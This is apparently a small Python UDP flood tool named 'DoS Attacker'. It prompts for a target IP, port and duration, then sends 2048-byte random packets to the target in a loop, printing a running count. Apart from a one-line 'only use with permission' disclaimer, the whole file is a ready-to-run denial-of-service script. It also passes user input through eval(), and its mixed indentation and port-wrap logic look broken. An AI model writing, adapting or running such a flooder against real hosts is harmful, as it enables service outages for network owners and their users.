import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("clear")
os.system("figlet DoS Attacker")
print()
print("Author    : Talvin Jacobs")
print("GitHub    : https://github.com/TalvinJacobs")
print("DISCLAIMER: ONLY USE WITH PERMISSION")

print()
ip = input("Target IP         : ")
port = eval(input("Port              : "))
duration = int(input("Duration (Seconds): "))
bytes = random._urandom(2048)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

os.system("clear")
os.system("figlet Attack Commencing...")
print("3")
time.sleep(1)
print("2")
time.sleep(1)
print("1")
time.sleep(1)
print()
print("GO!")
time.sleep(0.4)


timeout = time.time() + duration
sent = 0
while True:
	try:
	  if time.time() > timeout:
			print ("\nDone!")
			break
		else:
			pass
		sock.sendto(bytes, (ip,port))
		sent += 1
		print("Sent %s packets to %s through port:%s"%(sent,ip,port))

		if port == 65534:
			port = 1
	except KeyboardInterrupt:
		sys.exit()
